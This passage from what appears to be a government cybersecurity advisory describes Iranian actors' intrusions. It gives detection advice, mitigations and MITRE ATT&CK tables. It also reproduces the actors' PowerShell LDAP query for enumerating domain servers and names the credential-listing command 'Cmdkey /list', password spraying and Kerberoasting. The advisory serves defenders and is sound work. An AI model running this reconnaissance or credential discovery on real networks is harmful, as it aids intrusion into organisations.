<p>Next, the actors used the following Lightweight Directory Access Protocol (LDAP) query in PowerShell [<a href=\"https://attack.mitre.org/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>]to search the AD for computer display names, operating systems, descriptions, and distinguished names [<a href=\"https://attack.mitre.org/techniques/T1082/\" title=\"System Information Discovery\">T1082</a>].</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$i=0</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$D= [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$L='LDAP://' . $D</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$D = [ADSI]$L</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$Date = $((Get-Date).AddDays(-90).ToFileTime())</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$str = '(&amp;(objectcategory=computer)(operatingSystem=*serv*)(|(lastlogon&gt;='+$Date+')(lastlogontimestamp&gt;='+$Date+')))'</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s = [adsisearcher]$str</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s.searchRoot = $L.$D.distinguishedName</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s.PropertiesToLoad.Add('cn') &gt; $Null</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s.PropertiesToLoad.Add('operatingsystem') &gt; $Null</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s.PropertiesToLoad.Add('description') &gt; $Null</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$s.PropertiesToLoad.Add('distinguishedName') &gt; $Null</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>Foreach ($CA in $s.FindAll()) {</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>Write-Host $CA.Properties.Item('cn')</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$CA.Properties.Item('operatingsystem')</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$CA. Properties.Item('description')</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$CA.Properties.Item('distinguishedName')</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>$i++</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>}</code><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <code>Write-host Total servers: $i</code></p>
<h3><strong>Command and Control</strong></h3>
<p>On one occasion, using&nbsp;msedge.exe, the actors likely made outbound connections to Cobalt Strike Beacon command and control (C2) infrastructure [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a>].</p>
<h3><strong>Exfiltration and Collection</strong></h3>
<p>In a couple instances, while logged in to victim accounts, the actors downloaded files related to gaining remote access to the organization and to the organization’s inventory [<a href=\"https://attack.mitre.org/techniques/T1005/\" title=\"Data from Local System\">T1005</a>], likely exfiltrating the files to further persist in the victim network or to sell the information online.</p>
<h2><strong>Detection</strong></h2>
<p>To detect brute force activity, the authoring agencies recommend reviewing authentication logs for system and application login failures of valid accounts and looking for multiple, failed authentication attempts across all accounts.</p>
<p>To detect the use of compromised credentials in combination with virtual infrastructure, the authoring agencies recommend the following steps:</p>
<ul>
<li>Look for “impossible logins,” such as suspicious logins with changing usernames, user agent strings, and IP address combinations or logins where IP addresses do not align to the user’s expected geographic location.</li>
<li>Look for one IP used for multiple accounts, excluding expected logins.</li>
<li>Look for “impossible travel.” Impossible travel occurs when a user logs in from multiple IP addresses with significant geographic distance (i.e., a person could not realistically travel between the geographic locations of the two IP addresses during the period between the logins). <strong>Note:</strong> Implementing this detection opportunity can result in false positives if legitimate users apply VPN solutions before connecting into networks.</li>
<li>Look for MFA registrations with MFA in unexpected locales or from unfamiliar devices.</li>
<li>Look for processes and program execution command-line arguments that may indicate credential dumping, especially attempts to access or copy the&nbsp;<code>ntds.dit</code> file from a domain controller.</li>
<li>Look for suspicious privileged account use after resetting passwords or applying user account mitigations.</li>
<li>Look for unusual activity in typically dormant accounts.</li>
<li>Look for unusual user agent strings, such as strings not typically associated with normal user activity, which may indicate bot activity.</li>
</ul>
<h2><strong>Mitigations</strong></h2>
<p>The authoring agencies recommend organizations implement the mitigations below to improve organizations’ cybersecurity posture based on the actors’ TTPs described in this advisory. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA. The CPGs, which are organized to align to the National Institute of Standards and Technology (NIST) Cybersecurity Framework, are a subset of cybersecurity practices, aimed at meaningfully reducing risks to both critical infrastructure operations and the American people. These voluntary CPGs strive to help small- and medium-sized organizations kick-start their cybersecurity efforts by prioritizing investment in a limited number of essential actions with high-impact security outcomes. Visit CISA’s&nbsp;<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<ul>
<li>Review IT helpdesk password management related to initial passwords, password resets for user lockouts, and shared accounts. IT helpdesk password procedures may not align to company policy for user verification or password strength, creating a security gap. Avoid common passwords (e.g. “Spring2024” or “Password123!”).</li>
<li>Disable user accounts and access to organizational resources for departing staff [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#RevokingCredentialsforDepartingEmployees2D\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.D</a>]. Disabling accounts can minimize system exposure, removing options actors can leverage for entry into the system. Similarly, create new user accounts as close as possible to an employee’s start date.</li>
<li>Implement phishing-resistant MFA [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.H</a>]. See CISA’s resources&nbsp;<a href=\"https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf\" title=\"Implementing Phishing-Resistant MFA\">Phishing-Resistant Multifactor Authentication</a>&nbsp;and&nbsp;<a href=\"https://www.cisa.gov/MFA\" title=\"More than a Password\">More than a Password</a> for additional information on strengthening user credentials.</li>
<li>Continuously review MFA settings to ensure coverage over all active, internet-facing protocols to ensure no exploitable services are exposed [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NoExploitableServicesontheInternet2W\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.W</a>].</li>
<li>Provide basic cybersecurity training to users [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#BasicCybersecurityTraining2I\" title=\"Cross-Sector Cybersecurity Performance Goals\">CPG 2.I</a>] covering concepts such as:
<ul>
<li>Detecting unsuccessful login attempts [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectionofUnsuccessfulAutomatedLoginAttempts2G\">CPG 2.G</a>].</li>
<li>Having users deny MFA requests they have not generated.</li>
<li>Ensuring users with MFA-enabled accounts have MFA set up appropriately.</li>
</ul>
</li>
<li>Ensure password policies align with the latest <a href=\"https://pages.nist.gov/800-63-4/sp800-63.html\" title=\"NIST Digital Identity Guidelines\">NIST Digital Identity Guidelines</a>.
<ul>
<li>Meeting the minimum password strength [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MinimumPasswordStrength2B\">CPG 2.B</a>] by creating a password using 8-64 nonstandard characters and long passphrases, when possible.</li>
</ul>
</li>
<li>Disable the use of RC4 for Kerberos authentication.</li>
</ul>
<p>These mitigations apply to critical infrastructure entities across sectors.</p>
<p>The authoring agencies also recommend software manufacturers incorporate secure by design principles and tactics into their software development practices to protect their customers against actors using compromised credentials, thereby strengthening the security posture of their customers. &nbsp;For more information on secure by design, see CISA’s <a href=\"https://www.cisa.gov/securebydesign\" title=\"Secure by Design\">Secure by Design</a> webpage and <a href=\"https://www.cisa.gov/resources-tools/resources/secure-by-design-and-default\" title=\"Secure-by-Design\">joint guide</a>.</p>
<h2><strong>Validate Security Controls</strong></h2>
<p>In addition to applying mitigations, the authoring agencies recommend exercising, testing, and validating organization security programs against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see <strong>Table 1 to Table 12)</strong>.</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>The authoring agencies recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h2><strong>Contact Information</strong></h2>
<p>Organizations are encouraged to report suspicious or criminal activity related to information in this advisory to:</p>
<ul>
<li>CISA via CISA’s 24/7 Operations Center [<a href=\"mailto:report@cisa.gov\">report@cisa.gov</a> or 1-844-Say-CISA (1-844-729-2472)] or your local <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"FBI Field Offices\">FBI field office</a>. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.</li>
<li>For NSA cybersecurity guidance inquiries, contact <a href=\"mailto:CybersecurityReports@nsa.gov\">CybersecurityReports@nsa.gov</a>.</li>
</ul>
<h2><strong>Disclaimer</strong></h2>
<p>The information in this report is being provided “as is” for informational purposes only. The authoring agencies do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring agencies.</p>
<p>Intrusion events connected to this Iranian group may also include a different set of cyber actors–likely the third-party actors who purchased access from the Iranian group via cybercriminal forums or other channels. As a result, some TTPs and IOCs noted in this advisory may be tied to these third-party actors, not the Iranian actors. The TTPs and IOCs are in the advisory to provide recipients the most complete picture of malicious activity that may be observed on compromised networks. However, exercise caution if formulating attribution assessments based solely on matching TTPs and IOCs.</p>
<h2><strong>Version History</strong></h2>
<p><strong>October 16, 2024: </strong>Initial version.</p>
<h2><strong>Appendix A: MITRE ATT&amp;CK Tactics and Techniques</strong></h2>
<p>See <strong>Tables 1–12</strong>&nbsp;for all referenced actors’ tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK® Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"Decider Tool\">Decider Tool</a>.</p>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 1: Reconnaissance</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Gather Victim Identity Information</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1589/001/\" title=\"Gather Victim Identity Information: Credentials\">T1589</a></td>
<td>The actors likely gathered victim information.</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 2: Resource Development</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Obtain Capabilities: Tool</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/002/\" title=\"Obtain Capabilities: Tool\">T1588.002</a></td>
<td>The actors obtained a password spray tool through an open-source repository.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts</td>
<td><a href=\"https://attack.mitre.org/techniques/T1078/\" title=\"Valid Accounts\">T1078</a></td>
<td>The actors used password spraying to obtain valid user and group email account credentials, allowing them access to the network.</td>
</tr>
<tr>
<td>Valid Accounts: Cloud Accounts</td>
<td><a href=\"https://attack.mitre.org/techniques/T1078/004/\" title=\"Valid Accounts: Cloud Accounts\">T1078.004</a></td>
<td>The actors used accounts hosted on Microsoft 365, Azure, and Okta cloud environments as additional methods for initial access.</td>
</tr>
<tr>
<td>External Remote Services</td>
<td><a href=\"https://attack.mitre.org/techniques/T1133/\" title=\"External Remote Services\">T1133</a></td>
<td>The actors exploited Citrix systems’ external-facing remote services as another method for gaining initial access to the system.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title&nbsp;</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter: PowerShell</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a></td>
<td>The actors used PowerShell commands to maintain and expand access.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5: Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Account Manipulation: Device Registration</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1098/005/\" title=\"Account Manipulation: Device Registration\">T1098.005</a></td>
<td>The actors used PowerShell commands to maintain and expand access.</td>
</tr>
<tr>
<td>Modify Authentication Process</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1556/\" title=\"Modify Authentication Process\">T1556</a></td>
<td>The actors used a public facing Active Directory Federation Service (ADFS) domain to reset the passwords of expired accounts.</td>
</tr>
<tr>
<td>Modify Authentication Process: Multi-Factor Authentication</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1556/006/\" title=\"Modify Authentication Process: Multi-Factor Authentication\">T1556.006</a></td>
<td>The actors used an MFA bypass method, such as Multi-Factor Authentication Request Generation, providing the ability to modify or completely disable MFA defenses.</td>
</tr>
</tbody>
</table>
</div>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Privilege Escalation</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploitation for Privilege Escalation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1068/\" title=\"Exploitation for Privilege Escalation\">T1068</a></td>
<td>The actors attempted impersonation of the domain controller likely by exploiting CVE-2020-1472, Microsoft’s Netlogon Privilege Escalation vulnerability.</td>
</tr>
<tr>
<td>Domain or Tenant Policy Modification: Trust Modification</td>
<td><a href=\"https://attack.mitre.org/techniques/T1484/002/\" title=\"Domain or Tenant Policy Modification: Trust Modification\">T1484.002</a></td>
<td>The actors leveraged a public-facing ADFS password reset tool to reactivate inactive accounts, allowing the actor to authenticate and enroll their devices as any user in the AD managed by the victim tenant.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Defense Evasion</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Indirect Command Execution</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1202/\" title=\"Indirect Command Execution\">T1202</a></td>
<td>The actors attempted impersonation of the Domain Controller likely by exploiting CVE-2020-1472, Microsoft’s Netlogon Privilege Escalation vulnerability.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Brute Force: Password Spraying</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a></td>
<td>The actors targeted applications, including Single Sign-on (SSO) Microsoft Office 365, using brute force password sprays and imported the tool <code>DomainPasswordSpray.ps1</code>.</td>
</tr>
<tr>
<td>Credentials from Password Stores</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1555/\" title=\"Credentials from Password Stores\">T1555</a></td>
<td>The actors used the command <code>Cmdkey /list</code> likely to display usernames and credentials.</td>
</tr>
<tr>
<td>Steal or Forge Kerberos Tickets: Kerberoasting</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1558/003/\" title=\"Steal or Forge Kerberos Tickets: Kerberoasting\">T1558.003</a></td>
<td>The actors performed Kerberos Service Principal Name (SPN) enumeration of several service accounts and received Rivest Cipher 4 (RC4) tickets.</td>
</tr>
<tr>
<td>Multi-Factor Authentication Request Generation</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1621/\" title=\"Multi-Factor Authentication Request Generation\">T1621</a></td>
<td>The actors sent MFA requests to legitimate users.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: Discovery</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote System Discovery</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1018\" title=\"Remote System Discovery\">T1018</a></td>
<td>The actors used LOTL to return information about domain controllers.</td>
</tr>
<tr>
<td>Permission Groups Discovery: Domain Groups</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1069/002/\" title=\"Permission Groups Discovery: Domain Groups\">T1069.002</a></td>
<td>The actors used LOTL to return lists of domain administrators and enterprise administrators.</td>
</tr>
<tr>
<td>Permission Groups Discovery: Cloud Groups</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1069/003/\" title=\"Permission Groups Discovery: Cloud Groups\">T1069.003</a></td>
<td>The actors used LOTL to return lists of domain administrators and enterprise administrators.</td>
</tr>
<tr>
<td>System Information Discovery&nbsp;</td>
<td><a href=\"https://attack.mitre.org/techniques/T1082/\" title=\"System Information Discovery\">T1082</a></td>
<td>The actors were able to query the AD to discover display names, operating systems, descriptions, and distinguished names from the computer.</td>
</tr>
<tr>
<td>Account Discovery: Domain Account</td>
